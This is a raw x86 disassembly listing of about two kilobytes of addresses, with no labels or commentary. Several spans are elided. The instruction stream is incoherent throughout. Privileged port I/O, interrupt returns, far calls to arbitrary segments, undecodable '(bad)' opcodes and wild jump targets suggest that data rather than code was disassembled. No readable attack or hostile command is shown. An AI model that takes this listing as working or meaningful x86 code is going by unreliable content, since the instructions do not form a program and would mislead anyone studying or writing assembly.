  414ce4:	bound  edi,QWORD PTR [edi+0xb]
  414ce7:	in     eax,0xc8
  414ce9:	and    dl,BYTE PTR [eax+edi*4-0x4c3b3f06]
  414cf0:	add    bl,BYTE PTR [ebp+0x4e]
  414cf3:	push   ebp
  414cf4:	sbb    al,0x4d
  414cf6:	punpckhwd mm5,QWORD PTR [ebx-0x462d3701]
  414cfd:	sbb    BYTE PTR ds:0x427397ab,bl
  414d03:	cmp    esp,esi
  414d05:	jle    0x414d2a
  414d07:	sbb    ecx,eax
  414d09:	shl    ecx,1
  414d0b:	cwde   
  414d0c:	in     eax,dx
  414d0d:	aad    0xe2
  414d0f:	xchg   edx,eax
  414d10:	inc    eax
  414d11:	and    eax,0x562f93e1
  414d16:	test   al,0x4e
  414d18:	jecxz  0x414d2b
  414d1a:	iret   
  414d1b:	dec    edx
  414d1c:	inc    edi
  414d1d:	add    DWORD PTR [eax+0x3],0xc6b55a79
  414d24:	sbb    esp,DWORD PTR [eax-0x25]
  414d27:	cli    
  414d28:	mov    edi,0x9a4bfa22
  414d2d:	outs   dx,DWORD PTR ds:[esi]
  414d2e:	sbb    eax,0x289030a5
  414d33:	cmp    BYTE PTR [ebx],ah
	...
  414d95:	add    BYTE PTR [edi+0x3e911299],dh
  414d9b:	fwait
  414d9c:	mov    bh,0xbf
  414d9e:	sbb    DWORD PTR [esi-0x2b08ebbb],ebp
  414da4:	jp     0x414d47
  414da6:	xor    ebx,ecx
  414da8:	add    BYTE PTR [eax],al
  414daa:	pop    es
  414dab:	add    DWORD PTR [eax],eax
  414dad:	add    dl,ah
  414daf:	dec    ecx
  414db0:	aad    0xea
  414db2:	jb     0x414dfa
  414db4:	sbb    DWORD PTR [ecx+0xeeb7ef],esp
  414dba:	in     al,0xad
  414dbc:	pop    edx
  414dbd:	mov    bh,0x85
  414dbf:	sbb    bh,BYTE PTR [eax]
  414dc1:	fs mov al,0x1c
  414dc4:	pop    ebp
  414dc5:	push   eax
  414dc6:	ja     0x414d62
  414dc8:	pop    ebx
  414dc9:	mov    esi,0xaa97edf7
  414dce:	sub    esp,ebx
  414dd0:	into   
  414dd1:	in     al,0x79
  414dd3:	add    esi,esp
  414dd5:	(bad)  
  414dd6:	cdq    
  414dd7:	and    edx,DWORD PTR ds:0x88534c64
  414ddd:	pop    es
  414dde:	xchg   esi,eax
  414ddf:	iret   
  414de0:	retf   0xd70c
  414de3:	and    eax,DWORD PTR [ecx+0x34]
  414de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414de8:	mov    esi,0x3ea7baa0
  414ded:	inc    ebx
  414dee:	jne    0xf9930fe9
  414df4:	mov    BYTE PTR [esi-0x4e],bh
  414df7:	mov    ch,0x7f
  414df9:	jo     0x414e5f
  414dfb:	lods   al,BYTE PTR ds:[esi]
  414dfc:	mov    ds:0x920ad510,al
  414e01:	aam    0x1c
  414e03:	xchg   ebp,eax
  414e04:	sbb    al,BYTE PTR [ecx-0xecc8748]
  414e0a:	pop    es
  414e0b:	inc    ebx
  414e0c:	leave  
  414e0d:	cli    
  414e0e:	das    
  414e0f:	mov    edi,DWORD PTR [esi-0x5a]
  414e12:	and    esp,DWORD PTR [ebp+esi*2-0x5edd3080]
  414e19:	jbe    0x414e0a
  414e1b:	sub    eax,0x9ea0d767
  414e20:	in     eax,0x58
  414e22:	inc    esp
  414e23:	xchg   ecx,eax
  414e24:	mov    ecx,0x7af73ef1
  414e29:	or     BYTE PTR [ecx+eax*8],al
  414e2c:	sbb    al,0x9
  414e2e:	cld    
  414e2f:	xor    ch,BYTE PTR [edi+0x0]
  414e32:	and    eax,esp
  414e34:	test   BYTE PTR [ebp+eax*1+0x549d744f],dl
  414e3b:	and    DWORD PTR [edi],0xe
  414e3e:	or     eax,0xe42c66cd
  414e43:	jl     0x414ea3
  414e45:	and    al,0xd5
  414e47:	mov    ah,0x96
  414e49:	sub    DWORD PTR ds:0xd7754a6c,eax
  414e4f:	push   edi
  414e50:	dec    esp
  414e51:	xchg   edx,eax
  414e52:	aam    0x43
  414e54:	sbb    eax,0xfa84fd40
  414e59:	fld    DWORD PTR [eax+0x73ac9a1]
  414e5f:	pop    esp
  414e60:	arpl   WORD PTR ss:[ecx+0x986edca],ax
  414e67:	std    
  414e68:	xor    eax,0xd9a00c26
  414e6d:	and    DWORD PTR [ebx],edx
  414e6f:	xchg   ecx,ecx
  414e71:	ss cmp esi,edx
  414e74:	and    esi,esp
  414e76:	imul   ecx,DWORD PTR [eax+0x56],0x7fda0ba2
  414e7d:	mov    ds:0xb4b91682,al
  414e82:	mov    ecx,0xfb51e221
  414e87:	jg     0x414ec2
  414e89:	mov    ecx,0x4a101673
  414e8e:	addr16 enter 0xe7ee,0xf1
  414e93:	push   esp
  414e94:	mov    dl,0x4b
  414e96:	mov    ah,0xef
  414e98:	adc    eax,0xc0a00678
  414e9d:	shr    ah,cl
  414e9f:	adc    eax,0x119bbab7
  414ea4:	mov    ds,WORD PTR [ecx]
  414ea6:	add    ebp,DWORD PTR [edx-0x14]
  414ea9:	sbb    ebp,DWORD PTR [edi+0x3b]
  414eac:	out    dx,eax
  414ead:	arpl   WORD PTR [ecx+0x11],di
  414eb0:	cli    
  414eb1:	iret   
  414eb2:	xor    BYTE PTR [edi],ah
  414eb4:	ins    DWORD PTR es:[edi],dx
	...
  414f15:	add    BYTE PTR [edi],dh
  414f17:	data16 xor al,0x9b
  414f1a:	jne    0x414ef7
  414f1c:	mov    edi,0x6e73ee
  414f21:	xchg   ebp,eax
  414f22:	fidiv  DWORD PTR [edx-0x25c5d045]
  414f28:	add    BYTE PTR [eax],al
  414f2a:	pop    es
  414f2b:	add    DWORD PTR [eax],eax
  414f2d:	add    ch,dl
  414f2f:	test   eax,0x796a22d
  414f34:	push   edx
  414f35:	into   
  414f36:	add    al,0x61
  414f38:	mov    bl,ch
  414f3a:	rol    esp,cl
  414f3c:	leave  
  414f3d:	push   0x77
  414f3f:	xchg   DWORD PTR [edi+0x1710c38b],ebp
  414f45:	popa   
  414f46:	jp     0x414f88
  414f48:	arpl   WORD PTR [edx-0x1509682d],bx
  414f4e:	and    DWORD PTR [edx+0x97bb534],edi
  414f54:	mov    WORD PTR [esp+ecx*2-0x3],es
  414f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f59:	es jo  0x414fc8
  414f5c:	cmp    al,0x98
  414f5e:	outs   dx,DWORD PTR ds:[esi]
  414f5f:	push   0x229ba5de
  414f64:	or     ebx,ebx
  414f66:	sbb    bh,BYTE PTR [eax-0x2e]
  414f69:	push   ss
  414f6a:	iret   
  414f6b:	imul   edi,DWORD PTR [ebp-0x2bf0475d],0xf78e6431
  414f75:	xchg   edi,eax
  414f76:	mov    ds:0x31e2f136,eax
  414f7b:	lock mov ah,0xc7
  414f7e:	shl    esi,cl
  414f80:	cdq    
  414f81:	cwde   
  414f82:	cmp    ah,BYTE PTR [edx]
  414f84:	es cli 
  414f86:	test   DWORD PTR [eax],0x3a69ec03
  414f8c:	nop
  414f8d:	mov    eax,0x2190cec2
  414f92:	push   ss
  414f93:	inc    eax
  414f94:	iret   
  414f95:	push   0xffffff98
  414f97:	mov    dl,0xd8
  414f99:	jns    0x414f3f
  414f9b:	mov    ebp,0x308309bb
  414fa0:	mov    ds:0x147a7e5d,al
  414fa5:	icebp  
  414fa6:	stc    
  414fa7:	dec    esi
  414fa8:	mov    eax,ds:0xa2f75856
  414fad:	enter  0xafe7,0xb0
  414fb1:	push   0xffffffa5
  414fb3:	(bad)  
  414fb6:	loop   0x414f7a
  414fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fb9:	pop    ebx
  414fba:	int3   
  414fbb:	xor    ebx,0x88b4669a
  414fc1:	mov    ecx,0xd006b98f
  414fc6:	ss dec edi
  414fc8:	sub    al,0x89
  414fca:	push   ecx
  414fcb:	xor    ebp,esp
  414fcd:	xchg   DWORD PTR [ebx],esp
  414fcf:	push   esi
  414fd0:	aad    0x30
  414fd2:	mov    ah,0x7c
  414fd4:	pop    ebp
  414fd5:	xor    al,0x76
  414fd8:	adc    eax,0xa8c1b1fc
  414fdd:	xchg   ecx,eax
  414fde:	jl     0x414ff4
  414fe0:	sbb    al,0xc9
  414fe2:	loopne 0x414f6e
  414fe4:	mov    bl,0x99
  414fe6:	xchg   edx,eax
  414fe7:	and    esp,ebp
  414fe9:	cdq    
  414fea:	jp     0x414fc7
  414fec:	sti    
  414fed:	xchg   ecx,eax
  414fee:	jmp    0x239afc96
  414ff3:	jae    0x415023
  414ff5:	popf   
  414ff6:	and    al,BYTE PTR [eax]
  414ff8:	ret    
  414ff9:	sub    eax,0x892965ad
  414ffe:	test   DWORD PTR ds:0x7b067c77,0x3621ea58
  415008:	es adc al,0xbf
  41500b:	push   ecx
  41500c:	rcl    BYTE PTR [ebp+0x4103097],1
  415012:	out    0x69,al
  415014:	mov    cl,0xd0
  415016:	call   0x3947:0x67a0bf01
  41501d:	ss sbb ecx,0x5b6ab36d
  415024:	pop    ds
  415025:	lahf   
  415026:	out    0xdf,al
  415028:	and    dl,BYTE PTR [ecx-0x58d286cc]
  41502e:	push   esp
  41502f:	mov    ecx,0xc4b3b9cd
  415034:	or     eax,0x0
	...
  415095:	add    BYTE PTR [ebx+0x2],bh
  415098:	add    ebp,ebx
  41509a:	jnp    0x415087
  41509c:	sti    
  41509d:	xchg   edx,eax
  41509e:	and    BYTE PTR [ebx],ah
  4150a0:	pushf  
  4150a1:	test   eax,0xb80dc022
  4150a6:	inc    ecx
  4150a7:	fild   DWORD PTR [eax]
  4150a9:	add    BYTE PTR [edi],al
  4150ab:	add    DWORD PTR [eax],eax
  4150ad:	add    BYTE PTR ds:0x6bb7acec,bl
  4150b3:	hlt    
  4150b4:	(bad)  
  4150b5:	or     al,0x35
  4150b7:	pop    ebx
  4150b8:	sbb    DWORD PTR [edi-0x353f8ff1],eax
  4150be:	fidiv  DWORD PTR [edx+0x65]
  4150c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150c2:	mov    edi,0xcb9982cd
  4150c7:	in     al,0x30
  4150c9:	adc    ecx,DWORD PTR [ebp-0x6cc26e4a]
  4150cf:	shl    DWORD PTR [eax+0x43],0x84
  4150d3:	sub    DWORD PTR [eax+0x467d8c5a],ebp
  4150d9:	pop    eax
  4150da:	mov    esi,0x61f766ea
  4150df:	sub    DWORD PTR ds:0x43bc7883,0xefa28f5d
  4150e9:	cli    
  4150ea:	fsub   DWORD PTR [esi]
  4150ec:	out    0xc8,eax
  4150ee:	cmp    DWORD PTR [edi-0x672b4a7c],edx
  4150f4:	pop    esp
  4150f5:	adc    BYTE PTR [eax+ecx*8+0x45bc5360],0xb6
  4150fd:	clc    
  4150fe:	pop    ds
  4150ff:	mov    gs,WORD PTR [ebx]
  415101:	imul   eax,DWORD PTR [ebx+0x39],0xffffffb3
  415105:	dec    esi
  415106:	or     BYTE PTR [eax],dl
  415108:	dec    esp
  415109:	mov    bl,0xe3
  41510b:	fidiv  WORD PTR [esi]
  41510d:	dec    eax
  41510e:	gs in  eax,0xb
  415111:	xchg   ecx,eax
  415112:	sub    ebp,DWORD PTR [ecx+0x2e]
  415115:	sbb    al,0x55
  415117:	sar    DWORD PTR [esp],cl
  41511a:	xchg   BYTE PTR [edi],bl
  41511c:	aas    
  41511d:	out    0x65,eax
  41511f:	xor    bh,BYTE PTR [eax]
  415121:	inc    edx
  415122:	daa    
  415123:	adc    eax,0x5ea1dfdd
  415128:	lods   al,BYTE PTR ds:[esi]
  415129:	ret    0x68dd
  41512c:	push   edi
  41512d:	(bad)  
  41512e:	mov    ch,0xc3
  415130:	in     eax,0x82
  415132:	jl     0x415109
  415134:	adc    eax,0x8486b2e6
  415139:	popf   
  41513a:	pusha  
  41513b:	icebp  
  41513c:	sub    DWORD PTR [ebp-0x49f16599],esp
  415142:	push   0x34
  415144:	stos   DWORD PTR es:[edi],eax
  415145:	es repz mov dh,0x77
  415149:	fs out dx,eax
  41514b:	cmp    DWORD PTR [ecx-0x15],esi
  41514e:	add    DWORD PTR [ebp+ebp*2-0x32a56808],ecx
  415155:	cdq    
  415156:	repz xor BYTE PTR [esi+eax*2-0x4fffedc4],bl
  41515e:	adc    ah,BYTE PTR [ecx-0xa2c942c]
  415164:	add    al,0x65
  415166:	xchg   ah,bh
  415168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415169:	ficomp DWORD PTR [ecx]
  41516b:	xor    eax,0x4b8ddc41
  415170:	jne    0x415151
  415172:	js     0x415187
  415174:	fadd   DWORD PTR [ecx-0x55]
  415177:	dec    eax
  415178:	jns    0x4151ea
  41517a:	hlt    
  41517b:	dec    edx
  41517c:	test   al,0xf2
  41517e:	add    eax,0xbe04a953
  415183:	daa    
  415184:	pusha  
  415185:	std    
  415186:	ficom  DWORD PTR [edx]
  415188:	xchg   edx,eax
  415189:	pop    ss
  41518a:	push   edi
  41518b:	cmp    al,0x1a
  41518d:	fst    QWORD PTR [eax+0x2390392c]
  415193:	outs   dx,DWORD PTR ds:[esi]
  415194:	xchg   BYTE PTR [eax-0x37],cl
  415197:	mov    ch,0x1
  415199:	xchg   edx,eax
  41519a:	mov    esp,0xfd168f96
  41519f:	in     al,dx
  4151a0:	outs   dx,DWORD PTR ds:[esi]
  4151a1:	pop    ebp
  4151a2:	aam    0x97
  4151a4:	loopne 0x415191
  4151a6:	in     eax,0x8a
  4151a8:	lahf   
  4151a9:	pop    edx
  4151aa:	inc    DWORD PTR [eax-0x386c3b14]
  4151b0:	push   es
  4151b1:	xchg   ebp,eax
  4151b2:	xor    eax,0xb6a9
	...
  415213:	add    BYTE PTR [eax],al
  415215:	add    BYTE PTR [edi+edx*4],ch
  415218:	pop    ds
  415219:	sar    DWORD PTR [edi+0xffeed9],1
  41521f:	lods   eax,DWORD PTR ds:[esi]
  415220:	std    
  415221:	mov    al,0x19
  415223:	adc    eax,0xdc483f3c
  415228:	add    BYTE PTR [eax],al
  41522a:	pop    es
  41522b:	add    DWORD PTR [eax],eax
  41522d:	add    bl,ch
  41522f:	mov    bh,0x4b
  415231:	arpl   bp,bx
  415233:	pop    edi
  415234:	fimul  WORD PTR [ebx]
  415236:	mov    ss,WORD PTR [ecx+0x40fe7de2]
  41523c:	ror    BYTE PTR [ecx+0x7b722156],0x9c
  415243:	mov    cl,0xeb
  415245:	shl    DWORD PTR [edi+esi*4+0x7d],cl
  415249:	and    ah,BYTE PTR [eax]
  41524b:	push   ss
  41524c:	sub    DWORD PTR [esi+0x59],esi
  41524f:	in     al,0x68
  415251:	inc    ecx
  415252:	loopne 0x41522e
  415254:	add    al,0x51
  415256:	inc    esi
  415257:	pushf  
  415258:	ret    0x11e7
  41525b:	xchg   esp,eax
  41525c:	loope  0x4152d1
  41525e:	das    
  41525f:	cdq    
  415260:	xchg   edi,eax
  415261:	mov    ds:0x6573fef9,al
  415266:	jns    0x415258
  415268:	hlt    
  415269:	ror    BYTE PTR [ebx-0x21],cl
  41526c:	out    0x7e,eax
  41526e:	inc    ecx
  41526f:	pop    esi
  415270:	sar    BYTE PTR [ebp-0x7a],1
  415273:	loope  0x41524b
  415275:	popa   
  415276:	adc    al,0x1e
  415278:	sub    DWORD PTR [ebx+0x7d],ecx
  41527b:	das    
  41527c:	nop
  41527d:	ja     0x41527e
  41527f:	and    edx,eax
  415281:	mov    ds:0xfcaed226,eax
  415286:	adc    al,0xce
  415288:	cdq    
  415289:	aas    
  41528a:	xor    eax,0x4503c33a
  41528f:	int    0x78
  415291:	adc    al,0x51
  415293:	jae    0x4152ff
  415295:	jmp    0x953b:0x1065b7f
  41529c:	stc    
  41529d:	xchg   edi,eax
  41529e:	(bad)  
  41529f:	js     0x4152a6
  4152a1:	lods   eax,DWORD PTR ds:[esi]
  4152a2:	lds    esi,FWORD PTR [ebx-0x32]
  4152a5:	mov    ch,0x91
  4152a7:	iret   
  4152a8:	js     0x4152e4
  4152aa:	shr    BYTE PTR [edx],0x1d
  4152ad:	inc    ebx
  4152ae:	popf   
  4152af:	inc    ecx
  4152b0:	jns    0x415267
  4152b2:	sti    
  4152b3:	into   
  4152b4:	mov    ebp,0x6544ff50
  4152b9:	jo     0x415244
  4152bb:	retf   
  4152bc:	test   ecx,esi
  4152be:	push   eax
  4152bf:	gs and al,0x32
  4152c2:	mov    ds:0x7ac91ed3,al
  4152c7:	stos   DWORD PTR es:[edi],eax
  4152c8:	lock push 0xfffffff2
  4152cb:	outs   dx,DWORD PTR ds:[esi]
  4152cc:	cmp    BYTE PTR [ebx+0xfac609d],bh
  4152d2:	fdecstp 
  4152d4:	leave  
  4152d5:	bt     DWORD PTR [esi-0x80],edx
  4152d9:	shl    DWORD PTR [eax-0xc],0x59
  4152dd:	inc    edi
  4152de:	pop    esi
  4152df:	xchg   edx,eax
  4152e0:	dec    edi
  4152e1:	adc    al,0x11
  4152e3:	call   0x6f95:0x422b967d
  4152ea:	fist   DWORD PTR [edx]
  4152ec:	dec    edi
  4152ed:	jmp    FWORD PTR [edx]
  4152ef:	mov    ebx,0xecc4d5bf
  4152f4:	inc    eax
  4152f5:	and    dh,ch
  4152f7:	das    
  4152f8:	call   0xf5e0:0xee8056fa
  4152ff:	fbld   TBYTE PTR [ebx]
  415301:	int3   
  415302:	test   al,0xbf
  415304:	test   BYTE PTR [edx-0x2eecf5b9],bl
  41530a:	xchg   ebx,eax
  41530b:	retf   0x8f4b
  41530e:	xor    al,0x20
  415310:	dec    ecx
  415311:	call   0x278882d9
  415316:	call   0x169522d4
  41531b:	push   ss
  41531c:	loop   0x415378
  41531e:	pop    esp
  41531f:	xchg   edi,eax
  415320:	inc    esi
  415321:	and    al,0x2c
  415323:	(bad)  
  415324:	mov    bh,0x63
  415326:	jb     0x4153a4
  415328:	repz addr16 dec edi
  41532b:	jmp    0x3266ea75
  415330:	sub    dl,BYTE PTR [eax+0xf1d0e2]
	...
  415396:	ins    DWORD PTR es:[edi],dx
  415397:	lock repz jmp FWORD PTR cs:[edi]
  41539c:	std    
  41539d:	repz mov ebx,0x8f4b9b2a
  4153a3:	or     esp,DWORD PTR ds:[edx+0xdd4f]
  4153aa:	pop    es
  4153ab:	add    DWORD PTR [eax],eax
  4153ad:	add    BYTE PTR [eax-0x4428f911],cl
  4153b3:	dec    ecx
  4153b4:	push   edi
  4153b5:	push   edi
  4153b6:	in     al,dx
  4153b7:	cmc    
  4153b8:	cmc    
  4153b9:	into   
  4153ba:	enter  0x2867,0xf4
  4153be:	mov    edx,0x1892e34d
  4153c3:	ficom  DWORD PTR [edi-0x39990e96]
  4153c9:	div    BYTE PTR [ebp+edi*1+0x3ecc0675]
  4153d0:	stc    
  4153d1:	push   esp
  4153d2:	jbe    0x4153fd
  4153d4:	mov    bh,0x4b
  4153d6:	lea    eax,[eax-0x6b]
  4153d9:	push   edi
  4153da:	xchg   bl,bh
  4153dc:	imul   ecx,DWORD PTR [eax-0x3b603c79],0xffffffeb
  4153e3:	push   ss
  4153e4:	xor    al,0x5e
  4153e6:	xlat   BYTE PTR ds:[ebx]
  4153e7:	outs   dx,DWORD PTR ds:[esi]
  4153e8:	dec    esp
  4153e9:	(bad)
  4153ed:	push   ds
  4153ee:	iret   
  4153ef:	fwait
  4153f0:	inc    ebx
  4153f1:	pop    esi
  4153f2:	out    dx,eax
  4153f3:	jb     0x415433
  4153f5:	retf   
  4153f6:	int    0x20
  4153f8:	inc    ebx
  4153f9:	xchg   ecx,eax
  4153fa:	xor    al,0x27
  4153fc:	leave  
  4153fd:	pop    ds
  4153fe:	dec    edi
  4153ff:	mov    bh,0xfa
  415401:	push   edx
  415402:	mov    esi,0x85682c
  415407:	mov    ds,WORD PTR [ebx-0x77c8f776]
  41540d:	ret    0x810f
  415410:	dec    edx
  415411:	adc    DWORD PTR ds:0x7296d7f,esi
  415417:	pop    edx
  415418:	out    dx,eax
  415419:	div    cl
  41541b:	sbb    DWORD PTR [edi+eax*8],esi
  41541e:	call   0xdfea:0xe9dca087
  415425:	mov    bl,0xc6
  415427:	xchg   ebp,eax
  415428:	xor    ch,BYTE PTR [eax-0x7b56a94d]
  41542e:	fs sti 
  415430:	sbb    DWORD PTR [esi],ebp
  415432:	cwde   
  415433:	hlt    
  415434:	inc    edx
  415435:	add    eax,0x9c7eccdb
  41543a:	adc    al,0xc5
  41543c:	add    dh,ah
  41543e:	cmp    al,0x85
  415440:	jo     0x415471
  415442:	jns    0x4153dd
  415444:	pop    esp
  415445:	inc    esp
  415446:	jne    0x415436
  415448:	jecxz  0x4154bf
  41544a:	inc    esp
  41544b:	bound  ebx,QWORD PTR [eax+0x140dca06]
  415451:	sbb    eax,DWORD PTR [eax+eax*4+0x4cee8e45]
  415458:	sbb    ah,BYTE PTR ds:0x3c947b66
  41545e:	(bad)  
  41545f:	mov    bh,0xd9
  415461:	jecxz  0x4154e2
  415463:	pop    ebx
  415464:	and    BYTE PTR [edx+0x28],0xf9
  415468:	inc    ecx
  415469:	in     al,dx
  41546a:	cli    
  41546b:	fucompp 
  41546d:	push   ecx
  41546e:	data16 cmp al,BYTE PTR [edx]
  415471:	shl    BYTE PTR [ecx],cl
  415473:	pop    ebp
  415474:	in     al,0xc6
  415476:	sub    eax,0x9f7599f7
  41547b:	push   esi
  41547c:	retf   
  41547d:	pop    es
  41547e:	xchg   esp,eax
  41547f:	mov    ecx,0x7a2b042
  415484:	lods   eax,DWORD PTR ds:[esi]
  415485:	inc    esp
  415486:	loope  0x4154a0
  415488:	xor    al,0x18
  41548a:	aam    0xed
  41548c:	xrelease xchg DWORD PTR [ebx],ebp
  41548f:	inc    ecx
  415490:	cmp    eax,0x844863f7
  415495:	les    edx,FWORD PTR [edx]
  415497:	inc    edi
  415498:	xchg   edx,eax
  415499:	pop    ebx
  41549a:	mov    edx,0x5a50c08e
  41549f:	test   eax,0x9ee95c70
  4154a4:	dec    ebp
  4154a5:	adc    DWORD PTR [eax],edx
  4154a7:	or     dh,dl
  4154a9:	push   ebp
  4154aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154ab:	fdiv   DWORD PTR [eax+esi*1+0x53e6ae4c]
  4154b2:	fld    QWORD PTR [esi+0xd0]
	...
  415514:	add    BYTE PTR [eax],al
  415516:	in     al,0xf0
  415518:	sub    DWORD PTR [edx],ecx
  41551a:	cmp    eax,0xc0fee7db
  41551f:	cmp    ebx,DWORD PTR [edi]
  415521:	pop    esp
  415522:	add    bh,0x1b
  415525:	sti    
  415526:	push   esi
  415527:	fiadd  WORD PTR [eax]
  415529:	add    BYTE PTR [edi],al
  41552b:	add    DWORD PTR [eax],eax
  41552d:	add    BYTE PTR [edi+0x576e18f8],al
  415533:	arpl   WORD PTR [ebp+edx*4+0x26e815a7],cx
  41553a:	retf   0xc8d3
  41553d:	mov    cl,0xa6
  41553f:	push   ebx
  415540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415541:	mov    eax,ds:0x60856a8e
  415546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415547:	push   ebx
  415548:	pop    esi
  415549:	aas    
  41554a:	hlt    
  41554b:	popf   
  41554c:	outs   dx,DWORD PTR ds:[esi]
  41554d:	jp     0x415534
  41554f:	add    al,0x96
  415551:	bound  eax,QWORD PTR [eax+esi*1]
  415554:	fs std 
  415556:	mov    ch,0x8a
  415558:	jb     0x4155ba
  41555a:	inc    ebp
  41555b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41555c:	cli    
  41555d:	xor    DWORD PTR [ecx+0xc],esp
  415560:	test   eax,0x8f552f5a
  415565:	sbb    ah,BYTE PTR [esi+0x55]
  415568:	out    dx,al
  415569:	mov    ch,0xe
  41556b:	shl    DWORD PTR [edi],1
  41556d:	fist   WORD PTR [ebx-0x6d30753b]
  415573:	fs jb  0x415515
  415576:	arpl   WORD PTR cs:[edx],bp
  415579:	cmp    BYTE PTR [edi],0x76
  41557c:	and    al,0x33
  41557e:	clc    
  41557f:	push   0x25
  415581:	(bad)  
  415582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415583:	or     DWORD PTR [edx],edx
  415585:	fs pop esp
  415587:	test   al,0xd3
  415589:	adc    al,0x8f
  41558b:	in     al,0x5f
  41558d:	xor    al,0x66
  41558f:	push   esi
  415590:	xlat   BYTE PTR ds:[ebx]
  415591:	hlt    
  415592:	cmc    
  415593:	aad    0xd2
  415595:	scas   al,BYTE PTR es:[edi]
  415596:	adc    eax,0xbedd9e53
  41559b:	adc    al,0xa0
  41559d:	(bad)  
  41559e:	xor    BYTE PTR [ebx],ch
  4155a0:	sbb    ah,bl
  4155a2:	adc    DWORD PTR [ebx+0x55],ebx
  4155a5:	lea    esi,[esi]
  4155a7:	std    
  4155a8:	push   DWORD PTR [ebp-0x1d9e5958]
  4155ae:	cmp    ah,BYTE PTR [esi-0x5]
  4155b1:	imul   edi,DWORD PTR [ecx],0xf1149f26
  4155b7:	mov    eax,gs
  4155b9:	das    
  4155ba:	sti    
  4155bb:	mov    ah,0x50
  4155bd:	aam    0x86
  4155bf:	mov    edi,0x8cb1b99b
  4155c4:	and    BYTE PTR [ebx+0x293a55f9],bl
  4155ca:	and    eax,0x83b355ec
  4155cf:	lds    edx,FWORD PTR [edx+0x1cc73010]
  4155d5:	mov    dh,0x59
  4155d7:	das    
  4155d8:	aad    0x43
  4155da:	sub    cl,BYTE PTR [edi]
  4155dc:	xchg   edx,eax
  4155dd:	adc    eax,0x50f505c7
  4155e2:	test   eax,0x3a565a6d
  4155e7:	xlat   BYTE PTR fs:[ebx]
  4155e9:	mov    ch,BYTE PTR [edx-0xc]
  4155ec:	fdivr  DWORD PTR [ebx+0x6135d630]
  4155f2:	ja     0x4155a8
  4155f4:	ror    BYTE PTR [edx+0x688f717b],0xc0
  4155fb:	ins    BYTE PTR es:[edi],dx
  4155fc:	stos   DWORD PTR es:[edi],eax
  4155fd:	dec    edi
  4155fe:	in     al,0x1f
  415600:	cmp    esp,DWORD PTR [eax-0x7d6f9072]
  415606:	test   dh,bh
  415608:	xchg   BYTE PTR [ebp+0x1ba2719a],dh
  41560e:	add    ah,dl
  415610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415611:	dec    edx
  415612:	push   0x73
  415614:	idiv   BYTE PTR [eax-0x18]
  415617:	dec    esi
  415618:	xchg   al,dh
  41561a:	cmp    al,0x93
  41561c:	inc    ebx
  41561d:	mov    al,0x59
  41561f:	stc    
  415620:	jb     0x4155d4
  415622:	fsub   QWORD PTR [ecx-0x68]
  415625:	jmp    0x8171247a
  41562a:	pop    eax
  41562b:	sub    eax,0xee6c5cea
  415630:	xor    DWORD PTR [eax],0x7efb6f
	...
  415696:	ins    DWORD PTR es:[edi],dx
  415697:	call   0xbafd:0x67ff45bc
  41569e:	retf   
  41569f:	inc    eax
  4156a0:	std    
  4156a1:	scas   eax,DWORD PTR es:[edi]
  4156a2:	daa    
  4156a3:	sbb    al,0xc0
  4156a5:	(bad)  
  4156a6:	pop    ebp
  4156a7:	fild   WORD PTR [eax]
  4156a9:	add    BYTE PTR [edi],al
  4156ab:	add    DWORD PTR [eax],eax
  4156ad:	add    BYTE PTR [edi],dh
  4156af:	mov    edi,0xbcbc34a
  4156b4:	sti    
  4156b5:	in     eax,dx
  4156b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156b7:	lods   eax,DWORD PTR ds:[esi]
  4156b8:	stos   BYTE PTR es:[edi],al
  4156b9:	fisub  WORD PTR [ebp-0x28]
  4156bc:	in     al,dx
  4156bd:	sub    eax,0x3046789c
  4156c2:	inc    ebp
  4156c3:	dec    ebp
  4156c4:	out    dx,eax
  4156c5:	loopne 0x415690
  4156c7:	mov    bh,0x4f
  4156c9:	inc    esp
  4156ca:	les    esi,FWORD PTR [eax-0x4]
  4156cd:	shl    DWORD PTR [edx+0x72],cl
  4156d0:	(bad)  
  4156d1:	mov    DWORD PTR [eax-0x12d4c5b0],ebx
  4156d7:	fld    TBYTE PTR [edx]
  4156d9:	adc    ebp,esp
  4156db:	mov    al,ds:0xf0a661a
  4156e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156e1:	mov    ebx,DWORD PTR [ecx+0x1c]
  4156e4:	cmp    BYTE PTR es:0x5b53a9f8,0xce
  4156ec:	mov    al,ds:0x688bbf39
  4156f1:	push   ds
  4156f2:	(bad)  
  4156f3:	jmp    0x4156a4
  4156f5:	sub    ch,BYTE PTR [ecx-0x29]
  4156f8:	lock je 0x415737
  4156fb:	shl    DWORD PTR [esi],0xf1
  4156fe:	neg    BYTE PTR [eax+0x12a04f3b]
  415704:	and    DWORD PTR [esi],esi
  415706:	inc    esi
  415707:	es (bad) 
  415709:	lahf   
  41570a:	js     0x4156a2
  41570c:	loopne 0x415785
  41570e:	bound  ebx,QWORD PTR [ebp-0x297b4b0a]
  415714:	push   eax
  415715:	cmp    BYTE PTR [eax+ecx*4+0x25],bh
  415719:	pop    eax
  41571a:	or     DWORD PTR [edi],ebx
  41571c:	mov    esp,0xe863bb17
  415721:	push   ss
  415722:	fwait
  415723:	stos   BYTE PTR es:[edi],al
  415724:	lods   al,BYTE PTR ds:[esi]
  415725:	neg    DWORD PTR [ebx-0x70]
  415728:	fld    DWORD PTR [ecx+0x78]
  41572b:	and    ebx,esp
  41572d:	inc    ebp
  41572e:	js     0x41570b
  415730:	cdq    
  415731:	sub    bh,BYTE PTR [edi-0x19]
  415734:	ret    0x7cca
  415737:	adc    DWORD PTR [edi],ebp
  415739:	adc    DWORD PTR [ebx],ecx
  41573b:	aaa    
  41573c:	or     BYTE PTR [edi+eax*8+0x5d],al
  415740:	lahf   
  415741:	pop    esi
